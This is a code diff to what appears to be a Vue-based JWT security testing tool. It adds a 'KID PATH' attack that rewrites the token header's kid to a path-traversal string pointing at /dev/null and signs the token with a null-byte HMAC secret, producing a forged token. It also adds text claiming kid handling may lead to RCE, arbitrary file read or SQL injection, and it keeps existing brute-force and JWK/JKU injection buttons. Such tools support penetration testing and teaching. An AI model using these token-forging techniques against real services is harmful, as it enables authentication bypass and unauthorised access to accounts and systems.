@@ -102,7 +102,7 @@ const select_alg = () => {
 }
 
 const decodeJwt = () => {
-
+    jwt_secret_key.value = ""
     let jwt = sjwt.value.trim().split(".")
     if (jwt.length > 3) {
         alert("Invalid JWT format!")
@@ -329,11 +329,28 @@ const jku_injection_attack = async () => {
     }
 
 }
+const kid_path_attack = async () => {
+    if (selected_alg.value.includes("HS")) {
+        console.log(123);
 
+        let h = JSON.parse(header.value)
+        h.kid = "../../../../../../../dev/null"
+        header.value = JSON.stringify(h, null, 2)
+        const secret = new TextEncoder().encode(
+            atob("AA=="),
+        )
+        const jwt = await new SignJWT(JSON.parse(payload.value))
+            .setProtectedHeader(JSON.parse(header.value))
+            .sign(secret)
+        tjwt.value = jwt
+    } else {
+        alert("Only HMAC algorithms support KID path attack.")
+    }
+}
 onMounted(async () => {
     sjwt.value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.CQ13a7rjONXqoy8ARzP8oyKBI2PMNl7z76FCvuKVxo0"
-    jwt_secret_key.value = "secure"
     decodeJwt()
+    jwt_secret_key.value = "secure"
     encodeJwt()
 })
 </script>
@@ -384,11 +401,14 @@ onMounted(async () => {
                 <v-btn class="ml-4" @click="brute_force_attack">Brute</v-btn>
                 <v-btn class="ml-4" @click="jwk_injection_attack">JWK IJ</v-btn>
                 <v-btn class="ml-4" @click="jku_injection_attack">JKU IJ</v-btn>
-                <v-btn class="ml-4">KID PATH</v-btn>
+                <v-btn class="ml-4" @click="kid_path_attack">KID PATH</v-btn>
             </div>
+            <p class="mt-4">Kid path may be stored in database or use command to read, so it may have <b>RCE</b>, <b>Any
+                    File read</b>
+                or <b>SQL
+                    injection</b> </p>
             <p class="mt-4">Dictionary: <a
                     href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a></p>
-
         </div>
 
 
